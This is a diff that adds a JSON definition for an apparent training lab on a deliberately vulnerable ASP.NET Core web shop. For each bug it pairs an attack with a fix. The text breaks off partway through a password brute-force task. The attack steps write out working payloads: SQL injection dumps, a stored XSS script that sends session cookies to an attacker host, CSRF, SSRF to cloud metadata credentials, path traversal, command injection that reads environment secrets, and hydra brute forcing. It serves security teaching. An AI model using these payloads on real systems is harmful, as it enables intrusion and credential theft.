@@ -1,0 +1,398 @@
+{
+  "title": "Live lab: the vulnerable shop",
+  "module": "Web security · OWASP Top 10, attack then fix",
+  "minutes": 150,
+  "summary": "Lamp Shop is a small ASP.NET Core web shop with a real database, a staff member who reads every review in a real browser, and a cloud metadata service next door. It has the classic bugs. For each one: exploit it from the attacker workstation, then fix the C# source in the page editor, rebuild, and let the lab prove the attack is gone and the shop still works.",
+  "download": "The first start builds two images (about 3 GB on disk: the .NET 10 SDK, and Debian with Chromium, sqlmap and hydra), which takes a few minutes and needs the internet once. After that the lab runs offline. It uses about 1.5 GB of memory while running, so stop it when you take a break.",
+  "ready_seconds": 240,
+  "nodes": {
+    "attacker": "your attacker workstation: curl, jq, python3, sqlmap, hydra, listen, baseline-scan",
+    "shop": "the Lamp Shop web app (:8080) and its source in /work/shop: edit, then shop-rebuild",
+    "bot": "a staff member, always signed in, in a real headless Chromium",
+    "internal": "metadata 169.254.169.254, cdn.shop.example, payments.internal (only the shop can reach them)"
+  },
+  "default_node": "attacker",
+  "ready": [
+    { "node": "shop", "cmd": "test -f /work/.seeded && curl -s -m2 -o /dev/null http://127.0.0.1:8080/" },
+    { "node": "shop", "cmd": "curl -s -m2 -o /dev/null http://cdn.shop.example/specs/desk-lamp.html && curl -s -m2 -o /dev/null http://169.254.169.254/latest/" },
+    { "node": "attacker", "cmd": "curl -s -m2 -o /dev/null http://shop:8080/" },
+    { "node": "bot", "cmd": "test -f /tmp/bot-ready" }
+  ],
+  "vars": {
+    "ADMINPW": { "type": "int", "min": 100000000, "max": 999999999 },
+    "BOBPW": { "type": "int", "min": 100000000, "max": 999999999 },
+    "CAROLPW": { "type": "choice", "options": ["sunshine1", "dragon2026", "football7", "princess9", "iloveyou2", "monkey12", "letmein!", "brightidea"] },
+    "PIN": { "type": "int", "min": 100000, "max": 999999 },
+    "GATECODE": { "type": "int", "min": 1000, "max": 9999 },
+    "PAYKEY": { "type": "flag" },
+    "DEPLOY": { "type": "int", "min": 10000000, "max": 99999999 },
+    "AKID": { "type": "int", "min": 100000, "max": 999999 }
+  },
+  "tasks": [
+    {
+      "id": "t1",
+      "type": "answer",
+      "title": "Attack: read someone else's order (IDOR)",
+      "text": "On **attacker**, sign in as the demo customer **alice** (password `wonderland`) and keep the session cookie in a cookie jar:\n\n```\ncurl -i -c jar -d 'username=alice&password=wonderland' http://shop:8080/login\ncurl -s -b jar http://shop:8080/api/orders | jq\ncurl -s -b jar http://shop:8080/api/orders/1001 | jq\n```\n\nAlice's orders are 1001 and 1002. The ids are sequential. Ask for an order that is **not** hers. Order 1003 has a delivery note with a gate code. What is the code?",
+      "answer": ["{{GATECODE}}"],
+      "hints": [
+        "Change the number in the URL: `curl -s -b jar http://shop:8080/api/orders/1003 | jq`.",
+        "The `delivery_note` field holds the code. The server checked that *someone* is signed in, never that the order is theirs."
+      ],
+      "solution": {
+        "note": "This is **broken object-level authorization** (IDOR / BOLA), A01:2025 Broken Access Control, and number one on the OWASP API Top 10. The endpoint authenticates the caller but never asks whose order it is. Anyone can count through every customer's address and gate code.",
+        "steps": [ { "node": "attacker", "cmd": "curl -s -c jar -o /dev/null -d 'username=alice&password=wonderland' http://shop:8080/login && curl -s -b jar http://shop:8080/api/orders/1003 | jq -r .delivery_note" } ]
+      }
+    },
+    {
+      "id": "t2",
+      "type": "state",
+      "title": "Fix: an ownership check on every order",
+      "text": "Now be the developer. Open a terminal on **shop** (click it in the diagram) and open the endpoint in the page editor:\n\n```\nnano /work/shop/Orders.cs\n```\n\nMake `GET /api/orders/{id}` return an order only to its owner. Anyone else gets **404**, exactly as if the order did not exist (a 403 would confirm that order 1003 is real). Save, then run `shop-rebuild` on shop. If the build fails, it prints the compiler error and the old version keeps running.\n\nThe check signs in as alice and as a brand new customer: alice still gets her own order 1001, nobody gets 1003 or anyone else's.",
+      "checks": [
+        { "node": "shop", "cmd": "bash /lab/checks/check.sh idor-blocked", "fail_msg": "Alice still gets something other than 404 for order 1003. Did shop-rebuild say the shop is running the new build?" },
+        { "node": "shop", "cmd": "bash /lab/checks/check.sh idor-own", "fail_msg": "The attack is blocked, but alice can no longer read her own order 1001 (or a new customer can read it)." }
+      ],
+      "hints": [
+        "The fix belongs in the query itself: look the order up by its id **and** its owner. `user.Id` is the signed-in customer.",
+        "```\n\"SELECT ... FROM orders WHERE id = $id AND user_id = $u\",\n(\"$id\", id), (\"$u\", user.Id)\n```\nThe existing `order is null ? Results.NotFound()` then does the rest."
+      ],
+      "solution": {
+        "note": "Putting the owner in the `WHERE` clause means there is no code path that loads someone else's order and forgets to check. In EF Core: `db.Orders.Where(o => o.Id == id && o.UserId == userId)`. For staff who may see every order, check a policy (`IAuthorizationService.AuthorizeAsync(user, order, \"OrderOwnerOrStaff\")`).",
+        "steps": [ { "node": "shop", "cmd": "cp /lab/solution/Orders.cs /work/shop/Orders.cs && shop-rebuild" } ]
+      }
+    },
+    {
+      "id": "t3",
+      "type": "state",
+      "title": "Attack: make yourself an admin (mass assignment)",
+      "text": "The account page loads your profile with `GET /api/me`, lets you edit it, and sends the whole object back with `PUT /api/me`. Look at what comes back:\n\n```\ncurl -s -b jar http://shop:8080/api/me | jq\n```\n\nThe server saves what the client sends. Send your profile back with one field changed so that **alice becomes an admin**.",
+      "checks": [
+        { "node": "shop", "cmd": "bash /lab/checks/check.sh massassign-attack", "fail_msg": "No customer is an admin yet. After your PUT, `curl -s -b jar http://shop:8080/api/me` should show \"isAdmin\": true." }
+      ],
+      "hints": [
+        "`curl -X PUT http://shop:8080/api/me -b jar -H 'Content-Type: application/json' -d '{...}'` with the same fields that GET returned.",
+        "```\ncurl -s -b jar -X PUT http://shop:8080/api/me -H 'Content-Type: application/json' \\\n  -d '{\"displayName\":\"Alice\",\"email\":\"alice@customer.example\",\"isAdmin\":true}' | jq\n```"
+      ],
+      "solution": {
+        "note": "This is **mass assignment** (over-posting): the endpoint binds the request body to a type that has fields the caller must never control. OWASP API Top 10 calls it Broken Object Property Level Authorization (API3:2023). The front-end never sends `isAdmin: true`; an attacker with curl does.",
+        "steps": [ { "node": "attacker", "cmd": "curl -s -c jar -o /dev/null -d 'username=alice&password=wonderland' http://shop:8080/login && curl -s -b jar -X PUT http://shop:8080/api/me -H 'Content-Type: application/json' -d '{\"displayName\":\"Alice\",\"email\":\"alice@customer.example\",\"isAdmin\":true}' | jq" } ]
+      }
+    },
+    {
+      "id": "t4",
+      "type": "state",
+      "title": "Fix: bind an input DTO, not the entity",
+      "text": "Fix `PUT /api/me` in `/work/shop/Profile.cs` (on **shop**), then `shop-rebuild`. A customer may change their **display name** and **email**, nothing else: `isAdmin`, `id`, `username` and `supportPin` in the body must be ignored.\n\nThe check registers a new customer, sends `isAdmin: true` (and someone else's id), and also checks that a normal name and email change still works.",
+      "checks": [
+        { "node": "attacker", "cmd": "bash /lab/checks/check.sh massassign-blocked", "fail_msg": "A new customer who sends \"isAdmin\": true is still made an admin (or can rename themselves to admin)." },
+        { "node": "attacker", "cmd": "bash /lab/checks/check.sh massassign-works", "fail_msg": "isAdmin is ignored now, but a normal change of displayName and email no longer works." }
+      ],
+      "hints": [
+        "Add a record with only the fields a customer may change, for example `public record ProfileUpdate(string DisplayName, string Email);`, and make the endpoint take that instead of `UserProfile`.",
+        "Then the `UPDATE` sets only `display_name` and `email`. The JSON binder ignores properties the type does not have, so `isAdmin` in the body simply has nowhere to go."
+      ],
+      "solution": {
+        "note": "An input DTO is an allow-list of writable fields. Never bind EF entities (or a `[Bind]`-less MVC model with `IsAdmin` on it) straight from a request. The fix does not demote alice: an attack that worked leaves its traces in the data, which is why incident response checks what changed (`select username from users where is_admin = 1`).",
+        "steps": [ { "node": "shop", "cmd": "cp /lab/solution/Profile.cs /work/shop/Profile.cs && shop-rebuild" } ]
+      }
+    },
+    {
+      "id": "t5",
+      "type": "answer",
+      "title": "Attack: dump the users table (SQL injection)",
+      "text": "The search box calls `GET /api/products/search?q=lamp`. Try a single quote: `curl -s 'http://shop:8080/api/products/search?q=%27'`. The answer is an error page that shows the SQL and a stack trace (that is a second bug, task 21).\n\nThe query has **three** columns. Use a `UNION SELECT` to make the search return rows from the `users` table instead. What is the `password_hash` of the user **admin**?\n\n`curl -G --data-urlencode 'q=...'` encodes the payload for you.",
+      "answer_cmd": { "node": "shop", "cmd": "sqlite3 /work/data/shop.db \"select password_hash from users where username = 'admin'\"" },
+      "hints": [
+        "Close the string, add your own query, and comment out the rest: `q=' UNION SELECT ... FROM users--`. Both sides of a UNION need the same number of columns (3).",
+        "```\ncurl -s -G http://shop:8080/api/products/search \\\n  --data-urlencode \"q=' UNION SELECT id, username || ':' || password_hash, is_admin FROM users--\" | jq\n```\n`||` joins strings in SQLite, so username and hash fit in the one text column.",
+        "sqlmap does the same automatically: `sqlmap -u 'http://shop:8080/api/products/search?q=lamp' --batch --dbms=sqlite -T users --dump`."
+      ],
+      "solution": {
+        "note": "The search text was glued into the SQL, so a quote ended the string and the rest became SQL. The hashes are unsalted SHA-256: fast to compute, so a wordlist cracks weak ones in seconds (carol's is in /root/top-passwords.txt). Injection is A05:2025; the weak hashing is A04 Cryptographic Failures.",
+        "steps": [ { "node": "attacker", "cmd": "curl -s -G http://shop:8080/api/products/search --data-urlencode \"q=' UNION SELECT id, username || ':' || password_hash, is_admin FROM users--\" | jq -r '.[].name' | grep '^admin:'" } ]
+      }
+    },
+    {
+      "id": "t6",
+      "type": "state",
+      "title": "Fix: parameterize the query",
+      "text": "Fix the search in `/work/shop/Search.cs`, then `shop-rebuild`. The search text must travel as a **parameter**, never as part of the SQL string. The check replays UNION, `OR 1=1` and hidden-product payloads, and also checks that a search for `lamp` and for `O'Clock` (a real product with a quote in its name) still work.",
+      "checks": [
+        { "node": "attacker", "cmd": "bash /lab/checks/check.sh sqli-blocked", "fail_msg": "An injection payload still returns users, hidden products or SQLite's version." },
+        { "node": "attacker", "cmd": "bash /lab/checks/check.sh sqli-works", "fail_msg": "The payloads are blocked, but a normal search no longer works: `lamp` should find the desk and floor lamps, and `O'Clock` the Night Owl O'Clock Lamp. Escaping or rejecting quotes breaks real searches; parameters do not." }
+      ],
+      "hints": [
+        "`Db.Query(sql, (\"$q\", q))` sends a parameter. In the SQL, the parameter is a whole value: build the `%...%` around it in SQL.",
+        "`\"... WHERE hidden = 0 AND name LIKE '%' || $q || '%' ORDER BY name\"` and pass `(\"$q\", q ?? \"\")`."
+      ],
+      "solution": {
+        "note": "With a parameter the database receives the SQL and the value separately, so no value can change the query's shape. Do not 'sanitize' quotes: it breaks O'Clock and misses other encodings. In EF Core, `FromSql($\"... {q}\")` and `SqlQuery` turn interpolation into parameters; `FromSqlRaw(\"...\" + q)` does not.",
+        "steps": [ { "node": "shop", "cmd": "cp /lab/solution/Search.cs /work/shop/Search.cs && shop-rebuild" } ]
+      }
+    },
+    {
+      "id": "t7",
+      "type": "answer",
+      "title": "Attack: steal the staff session with stored XSS",
+      "text": "A member of staff (the **bot** host) reads every new review in a real Chromium browser, signed in. Reviews are shown as HTML. On **attacker**:\n\n1. Start a web server that logs every request: `listen` (log: `tail ~/listen.log`).\n2. As alice, post a review whose script sends `document.cookie` to `http://attacker:8000/`.\n3. Wait a few seconds, read the log, and use the stolen `sid` cookie yourself.\n\nWith the staff session, `GET /api/me` shows the staff member's **support PIN**. What is it?",
+      "answer": ["PIN-{{PIN}}", "{{PIN}}"],
+      "hints": [
+        "```\ncurl -s -b jar -X POST http://shop:8080/api/reviews -H 'Content-Type: application/json' \\\n  -d '{\"productId\":1,\"body\":\"Great lamp <script>new Image().src=\\\"http://attacker:8000/c?\\\"+document.cookie</script>\"}'\n```\nThen `tail ~/listen.log`. On **bot**, `tail /var/log/bot.log` shows when the staff member read it.",
+        "The log line has `GET /c?sid=...`. Use it: `curl -s -b 'sid=<value>' http://shop:8080/api/me | jq .supportPin`."
+      ],
+      "solution": {
+        "note": "Stored XSS: your text became code in someone else's browser, with their session. Three defences failed at once: the page wrote user input as HTML (`Html.Raw`), the session cookie was readable by scripts (no `HttpOnly`), and no Content-Security-Policy stopped an unknown script. Task 8 fixes all three.",
+        "steps": [
+          { "node": "attacker", "cmd": "listen; curl -s -c jar -o /dev/null -d 'username=alice&password=wonderland' http://shop:8080/login; curl -s -b jar -X POST http://shop:8080/api/reviews -H 'Content-Type: application/json' -d '{\"productId\":1,\"body\":\"Great lamp <script>new Image().src=\\\"http://attacker:8000/c?\\\"+document.cookie</script>\"}'; sleep 10; tail -n 5 ~/listen.log" },
+          { "node": "attacker", "cmd": "sid=$(grep -o 'sid=[0-9a-f]*' ~/listen.log | tail -1 | cut -d= -f2); curl -s -b \"sid=$sid\" http://shop:8080/api/me | jq -r .supportPin" }
+        ]
+      }
+    },
+    {
+      "id": "t8",
+      "type": "state",
+      "title": "Fix: encode, HttpOnly, and a strict CSP",
+      "text": "Fix it in depth, on **shop**, then `shop-rebuild`:\n\n1. **Encode the output.** In `Pages/Product.cshtml`, show the review body as text, the Razor way.\n2. **HttpOnly cookie.** In `Session.cs`, scripts must not be able to read the session cookie (set `SameSite` too: task 10 needs it).\n3. **A strict CSP.** In `Csp.cs`, send `Content-Security-Policy` with a fresh random **nonce** per response, `script-src 'nonce-...' 'strict-dynamic'`, and no `unsafe-inline`. Give the page's own `<script>` that nonce, so it keeps working.\n\nThe check opens a page with fresh payloads in a real browser, reads the cookie from a script, and checks that the page's own script still runs.",
+      "checks": [
+        { "node": "bot", "cmd": "bash /lab/checks/check.sh xss-probe", "fail_msg": "A script in a review still ran in the staff member's browser." },
+        { "node": "bot", "cmd": "bash /lab/checks/check.sh xss-cookie", "fail_msg": "Scripts can still read the sid cookie (document.cookie shows it). Set HttpOnly in Session.cs." },
+        { "node": "bot", "cmd": "bash /lab/checks/check.sh xss-page", "fail_msg": "The page's own script no longer runs: the CSP blocks it. Give that <script> the nonce from the same response." },
+        { "node": "attacker", "cmd": "bash /lab/checks/check.sh xss-encoded", "fail_msg": "Payloads are blocked, but the page still writes review HTML as HTML. Show the body with @r.Body (encoded), not Html.Raw." },
+        { "node": "attacker", "cmd": "bash /lab/checks/check.sh xss-csp", "fail_msg": "The page has no Content-Security-Policy with a nonce (or allows 'unsafe-inline', or the page's <script nonce=\"...\"> does not match the header)." }
+      ],
+      "hints": [
+        "Razor encodes everything written with `@`: `<div class=\"body\">@r.Body</div>`. `Html.Raw` is the opt-out. In Session.cs add `HttpOnly = true, SameSite = SameSiteMode.Lax`.",
+        "In Csp.cs, a middleware that makes a nonce, keeps it for the page and sets the header:\n\n```\napp.Use(async (ctx, next) => {\n    var nonce = Convert.ToBase64String(RandomNumberGenerator.GetBytes(16));\n    ctx.Items[\"csp-nonce\"] = nonce;\n    ctx.Response.Headers.ContentSecurityPolicy = $\"default-src 'self'; script-src 'nonce-{nonce}' 'strict-dynamic'; object-src 'none'; base-uri 'none'; frame-ancestors 'none'\";\n    await next();\n});\n```\n(`using System.Security.Cryptography;` at the top.)",
+        "In the page: `<script nonce=\"@HttpContext.Items[\"csp-nonce\"]\">`."
+      ],
+      "solution": {
+        "note": "Each layer stops the attack on its own: encoding stops the payload becoming code, the CSP stops code that slipped through, HttpOnly stops a script that does run from taking the session. The stolen session from task 7 still works until the staff member signs out: after an XSS incident, revoke every session (`DELETE FROM sessions`).",
+        "steps": [ { "node": "shop", "cmd": "cp /lab/solution/Pages/Product.cshtml /work/shop/Pages/Product.cshtml && cp /lab/solution/Session.cs /lab/solution/Csp.cs /work/shop/ && shop-rebuild" } ]
+      }
+    },
+    {
+      "id": "t9",
+      "type": "state",
+      "title": "Attack: change the staff email address (CSRF)",
+      "text": "Password resets go to an account's email address. Look at the account page as alice (`curl -s -b jar http://shop:8080/account`): the form posts to `/account/email`, and an old mobile app also uses `GET /account/email?email=...`.\n\nThe staff member opens the link in every support ticket. Put a page on your server (`~/www/` on **attacker**, served by `listen`) that makes the visitor's browser change **their** email to an address at `evil.example`. Then send a ticket with its link:\n\n```\ncurl -s -b jar -X POST http://shop:8080/api/support -H 'Content-Type: application/json' -d '{\"message\":\"Photo of my broken lamp\",\"url\":\"http://attacker:8000/photo.html\"}'\n```",
+      "checks": [
+        { "node": "shop", "cmd": "bash /lab/checks/check.sh csrf-attack", "fail_msg": "The staff account's email is not an @evil.example address yet. `tail /var/log/bot.log` on bot shows which link they opened and where the page ended." }
+      ],
+      "hints": [
+        "The browser sends the staff member's cookie with a request to the shop that **your** page starts. Which kind of request still carries a `SameSite=Lax` (or default) cookie across sites? A top-level navigation with GET.",
+        "```\ncat > ~/www/photo.html <<'EOF'\n<!doctype html><title>Photo</title>\n<script>location = 'http://shop:8080/account/email?email=attacker@evil.example';</script>\nEOF\n```\nThen `listen` (if it is not running) and send the ticket."
+      ],
+      "solution": {
+        "note": "Cross-site request forgery: the shop could not tell a request the user meant from one another site triggered, because the browser attached the cookie either way. Chrome treats a cookie without `SameSite` as `Lax`, and Lax still sends it on top-level GET navigations, which is why a state change on GET is CSRF-able. Next, an attacker would ask for a password reset for the staff account.",
+        "steps": [
+          { "node": "attacker", "cmd": "printf '%s\\n' '<!doctype html><title>Photo</title>' \"<script>location = 'http://shop:8080/account/email?email=attacker@evil.example';</script>\" > ~/www/photo.html; listen; curl -s -c jar -o /dev/null -d 'username=alice&password=wonderland' http://shop:8080/login; curl -s -b jar -X POST http://shop:8080/api/support -H 'Content-Type: application/json' -d '{\"message\":\"Photo of my broken lamp\",\"url\":\"http://attacker:8000/photo.html\"}'; sleep 12; tail -n 3 ~/listen.log" }
+        ]
+      }
+    },
+    {
+      "id": "t10",
+      "type": "state",
+      "title": "Fix: POST only, antiforgery tokens, SameSite",
+      "text": "Fix `/account/email` in `/work/shop/Account.cs`, then `shop-rebuild`:\n\n1. Changing the email must be **POST only**.\n2. The form carries an **antiforgery token**, and a POST without a valid token is refused. ASP.NET Core has it built in: `AddAntiforgery()`, `UseAntiforgery()`, `IAntiforgery.GetAndStoreTokens`, and `[FromForm]` parameters are then validated for you.\n3. The session cookie says `SameSite=Lax` (or `Strict`) itself (`Session.cs`, if task 8 did not already).\n\nThe check tries GET, then POST without a token, as a fresh customer, then submits the real form with its token, which must still work.",
+      "checks": [
+        { "node": "attacker", "cmd": "bash /lab/checks/check.sh csrf-get", "fail_msg": "GET /account/email?email=... still changes the address." },
+        { "node": "attacker", "cmd": "bash /lab/checks/check.sh csrf-notoken", "fail_msg": "A POST without an antiforgery token still changes the address." },
+        { "node": "attacker", "cmd": "bash /lab/checks/check.sh csrf-works", "fail_msg": "Forged requests are refused, but the real form (GET /account, then POST its hidden token with the new email) no longer works." },
+        { "node": "attacker", "cmd": "bash /lab/checks/check.sh csrf-samesite", "fail_msg": "The sid cookie has no SameSite=Lax or SameSite=Strict attribute. Set it in Session.cs." }
+      ],
+      "hints": [
+        "In `AddAccount`: `builder.Services.AddAntiforgery();`. At the start of `MapAccount`: `app.UseAntiforgery();`. Replace `MapMethods(..., [\"GET\", \"POST\"], ...)` with `app.MapPost(\"/account/email\", ([FromForm] string email, HttpContext ctx) => ...)` (`using Microsoft.AspNetCore.Mvc;`).",
+        "In `GET /account`, take `IAntiforgery antiforgery` as a parameter, call `var tokens = antiforgery.GetAndStoreTokens(ctx);` and add `<input type=\"hidden\" name=\"{tokens.FormFieldName}\" value=\"{Html.Enc(tokens.RequestToken)}\">` to the form (`using Microsoft.AspNetCore.Antiforgery;`)."
+      ],
+      "solution": {
+        "note": "The token is a secret the attacker's page cannot read (the same-origin policy stops it reading the shop's form), so it cannot forge the POST. SameSite is the second layer, and defaults vary by browser: set it explicitly. A JSON API that only accepts `Content-Type: application/json` is not reachable by a plain cross-site form, but do not rely on CORS settings for CSRF.",
+        "steps": [ { "node": "shop", "cmd": "cp /lab/solution/Account.cs /lab/solution/Session.cs /work/shop/ && shop-rebuild" } ]
+      }
+    },
+    {
+      "id": "t11",
+      "type": "answer",
+      "title": "Attack: reach the cloud metadata service (SSRF)",
+      "text": "Reviews can show link previews: `GET /api/preview?url=http://cdn.shop.example/specs/desk-lamp.html`. The **shop server** fetches the URL. Try it from attacker.\n\nYou cannot reach the internal network from attacker (`curl -m3 http://169.254.169.254/` times out), but the shop can. Like a cloud VM, it has a metadata service at `169.254.169.254` that hands out the temporary credentials of the role the shop runs as. Walk it: `/latest/meta-data/`, then `iam/security-credentials/`. What is the **AccessKeyId**?",
+      "answer": ["LABKEY{{AKID}}"],
+      "hints": [
+        "`curl -s -G http://shop:8080/api/preview --data-urlencode 'url=http://169.254.169.254/latest/meta-data/iam/security-credentials/' | jq -r .snippet` lists the role name.",
+        "Add the role name to the path: `.../iam/security-credentials/shop-web-role`. The snippet is the credentials as JSON."
+      ],
+      "solution": {
+        "note": "Server-side request forgery: the shop's network position became yours. On AWS these credentials act as the server's IAM role. SSRF is part of A01:2025 Broken Access Control now (it was its own category in 2021) and API7:2023. AWS IMDSv2 (a PUT for a session token first, and a hop limit of 1) stops this simple GET; require it on every instance.",
+        "steps": [ { "node": "attacker", "cmd": "curl -s -G http://shop:8080/api/preview --data-urlencode 'url=http://169.254.169.254/latest/meta-data/iam/security-credentials/shop-web-role' | jq -r .snippet | jq -r .AccessKeyId" } ]
+      }
+    },
+    {
+      "id": "t12",
+      "type": "state",
+      "title": "Fix: an allow-list, and no redirects",
+      "text": "Previews are only needed for the shop's own content host, `cdn.shop.example`. Fix `/work/shop/Preview.cs` on **shop**, then `shop-rebuild`.\n\nThe check replays the metadata URL, the same address spelled as a decimal number (`http://2852039166/`) and in hex, the `user@host` trick (`http://cdn.shop.example@169.254.169.254/`), an internal API, `file:///etc/passwd`, and the cdn's own **open redirect** (`http://cdn.shop.example/redirect?to=http://169.254.169.254/...`). A real spec sheet must still get its title.",
+      "checks": [
+        { "node": "attacker", "cmd": "bash /lab/checks/check.sh ssrf-blocked", "fail_msg": "One of the SSRF payloads still reaches the metadata service, the payments API or a local file. If only the redirect one gets through: turn off automatic redirects for this client." },
+        { "node": "attacker", "cmd": "bash /lab/checks/check.sh ssrf-works", "fail_msg": "The payloads are blocked, but a preview of http://cdn.shop.example/specs/desk-lamp.html no longer shows the title \"Desk lamp spec sheet\"." }
+      ],
+      "hints": [
+        "Parse the URL with `Uri.TryCreate(url, UriKind.Absolute, out var uri)` and check `uri.Scheme` (http or https), `uri.IdnHost` (in a set of allowed hosts) and `uri.IsDefaultPort`. Compare the parsed host, never the string: `cdn.shop.example@169.254.169.254` *starts with* the allowed name.",
+        "Redirects: in `AddPreview`, `.ConfigurePrimaryHttpMessageHandler(() => new SocketsHttpHandler { AllowAutoRedirect = false })` on the `preview` client. Then a 302 from the cdn goes nowhere."
+      ],
+      "solution": {
+        "note": "Allow-list the destinations, and check what will actually be fetched. In production also block private and link-local addresses after DNS resolution (a `SocketsHttpHandler.ConnectCallback` that checks the IP it connects to defeats DNS rebinding, where a name resolves to a public IP when you check and to 169.254.169.254 when you fetch), and send the fetcher through an egress proxy.",
+        "steps": [ { "node": "shop", "cmd": "cp /lab/solution/Preview.cs /work/shop/Preview.cs && shop-rebuild" } ]
+      }
+    },
+    {
+      "id": "t13",
+      "type": "answer",
+      "title": "Attack: read /etc/passwd (path traversal)",
+      "text": "Customers download invoices with `GET /api/invoices/download?file=invoice-1001.txt` (signed in, so use your `jar`). The file name goes straight into a path.\n\nRead `/etc/passwd` on the shop server. The shop runs as a service account named **shopsvc**. What is its numeric **user id** (UID)?",
+      "answer": ["1442"],
+      "hints": [
+        "The invoices live in `/work/data/invoices`. `../` goes up one folder. `curl -s -b jar -G http://shop:8080/api/invoices/download --data-urlencode 'file=../../../etc/passwd'`.",
+        "Even shorter: `file=/etc/passwd`. `Path.Combine(\"/work/data/invoices\", \"/etc/passwd\")` returns `/etc/passwd`, because a rooted second part replaces the first. The UID is the third field: `shopsvc:x:UID:...`."
+      ],
+      "solution": {
+        "note": "Path traversal. Because the shop runs as `shopsvc` and not as root, `/etc/shadow` is out of reach: least privilege limits the damage. But everything shopsvc can read is exposed, including `/proc/self/environ`, the shop's own environment variables (try it: task 15's secret is there).",
+        "steps": [ { "node": "attacker", "cmd": "curl -s -c jar -o /dev/null -d 'username=alice&password=wonderland' http://shop:8080/login && curl -s -b jar -G http://shop:8080/api/invoices/download --data-urlencode 'file=/etc/passwd' | grep shopsvc" } ]
+      }
+    },
+    {
+      "id": "t14",
+      "type": "state",
+      "title": "Fix: resolve the path and confine it",
+      "text": "Fix `/work/shop/Invoices.cs` on **shop**, then `shop-rebuild`. Whatever `file` says, the shop may only ever open files **inside** `/work/data/invoices`.\n\nThe check sends `../` sequences, an absolute path, `/proc/self/environ`, URL-encoded slashes, `....//`, and `../invoices-old/ledger.txt`: a sibling folder whose name *starts with* `invoices`. `invoice-1001.txt` must still download.",
+      "checks": [
+        { "node": "shop", "cmd": "bash /lab/checks/check.sh traversal-blocked", "fail_msg": "A traversal payload still reads a file outside /work/data/invoices. Did you check the folder name with the separator at the end? /work/data/invoices-old starts with /work/data/invoices." },
+        { "node": "shop", "cmd": "bash /lab/checks/check.sh traversal-works", "fail_msg": "Traversal is blocked, but alice can no longer download invoice-1001.txt." }
+      ],
+      "hints": [
+        "`Path.GetFullPath(Path.Combine(root, file))` resolves `..` and absolute paths into the real target. Then compare it with the folder.",
+        "```\nvar root = Path.GetFullPath(InvoiceDir) + Path.DirectorySeparatorChar;\nvar path = Path.GetFullPath(Path.Combine(root, file));\nif (!path.StartsWith(root, StringComparison.Ordinal)) return Results.BadRequest();\n```"
+      ],
+      "solution": {
+        "note": "Resolve first, then check: never try to strip `../` out of the string (`....//` becomes `../` after one pass). Even better, do not take paths from users at all: look the invoice up by order id (with the ownership check from task 2) and build the file name yourself.",
+        "steps": [ { "node": "shop", "cmd": "cp /lab/solution/Invoices.cs /work/shop/Invoices.cs && shop-rebuild" } ]
+      }
+    },
+    {
+      "id": "t15",
+      "type": "answer",
+      "title": "Attack: run commands on the server (command injection)",
+      "text": "Support staff use `GET /api/tools/ping?host=10.0.0.5` to see whether a customer's lamp hub answers, and any signed-in customer can call it too. Try `host=127.0.0.1`. The output looks like a shell's.\n\nMake it run `id`, then find the shop's deploy token: it is in the shop process's environment as `DEPLOY_TOKEN`. What is it?",
+      "answer": ["dt_{{DEPLOY}}"],
+      "hints": [
+        "The host is pasted into `sh -c \"ping -c 1 -W 1 <host>\"`. A `;` ends the ping command and starts yours: `host=127.0.0.1; id`.",
+        "`curl -s -b jar -G http://shop:8080/api/tools/ping --data-urlencode 'host=127.0.0.1; env' | jq -r .output | grep DEPLOY`"
+      ],
+      "solution": {
+        "note": "OS command injection: anything that reaches a shell is code. The shop's user can now read its secrets, reach the internal network and change its files. The same token was also readable through task 13 (`file=/proc/self/environ`): secrets in environment variables are only as safe as the process.",
+        "steps": [ { "node": "attacker", "cmd": "curl -s -c jar -o /dev/null -d 'username=alice&password=wonderland' http://shop:8080/login && curl -s -b jar -G http://shop:8080/api/tools/ping --data-urlencode 'host=127.0.0.1; env' | jq -r .output | grep DEPLOY_TOKEN" } ]
+      }
+    },
+    {
+      "id": "t16",
+      "type": "state",
+      "title": "Fix: no shell, validate, ArgumentList",
+      "text": "Fix `/work/shop/Tools.cs` on **shop**, then `shop-rebuild`. Start `ping` **directly** (no `/bin/sh`), pass the host as **one argument** with `ProcessStartInfo.ArgumentList`, and accept only an IP address or a host name (nothing starting with `-`, which ping would read as an option).\n\nThe check tries `;`, `&&`, `|`, `$(...)`, backticks, a newline and an option. Pinging `127.0.0.1` must still work.",
+      "checks": [
+        { "node": "shop", "cmd": "bash /lab/checks/check.sh cmdi-blocked", "fail_msg": "One of the payloads still runs `id` (uid= in the output)." },
+        { "node": "shop", "cmd": "bash /lab/checks/check.sh cmdi-works", "fail_msg": "Injection is blocked, but pinging 127.0.0.1 no longer works (no '1 packets transmitted' in the output)." }
+      ],
+      "hints": [
+        "`new ProcessStartInfo(\"ping\") { ArgumentList = { \"-c\", \"1\", \"-W\", \"1\", \"--\", host }, RedirectStandardOutput = true, RedirectStandardError = true }`. With no shell, `;` and `$( )` are just characters in a host name that does not exist.",
+        "Validate before starting anything: `if (!IPAddress.TryParse(host, out _) && !Regex.IsMatch(host, @\"^[A-Za-z0-9](?:[A-Za-z0-9.-]{0,252})$\")) return Results.BadRequest();` (`using System.Net; using System.Text.RegularExpressions;`)."
+      ],
+      "solution": {
+        "note": "`ArgumentList` hands each argument to the program as it is, with no shell parsing. `--` ends ping's options, so even a host like `-f` cannot become a flag (argument injection). Better still, use a library instead of a process: `System.Net.NetworkInformation.Ping.SendPingAsync(host)` needs no process at all.",
+        "steps": [ { "node": "shop", "cmd": "cp /lab/solution/Tools.cs /work/shop/Tools.cs && shop-rebuild" } ]
+      }
+    },
+    {
+      "id": "t17",
+      "type": "answer",
+      "title": "Attack: guess a password (brute force)",
+      "text": "The customer **carol** uses a common password. `/root/top-passwords.txt` on attacker holds a hundred of the most common ones. The sign-in form answers `Wrong username or password` when a guess is wrong, and never slows you down. Find carol's password with **hydra**, or with a short loop of your own. What is it?",
+      "answer": ["{{CAROLPW}}"],
+      "hints": [
+        "A loop: `while read -r p; do code=$(curl -s -o /dev/null -w '%{http_code}' -d \"username=carol&password=$p\" http://shop:8080/login); [ \"$code\" = 302 ] && echo \"FOUND $p\"; done < ~/top-passwords.txt` (a right password redirects with 302).",
+        "hydra: `hydra -l carol -P ~/top-passwords.txt -s 8080 -f shop http-post-form '/login:username=^USER^&password=^PASS^:F=Wrong username'`."
+      ],
+      "solution": {
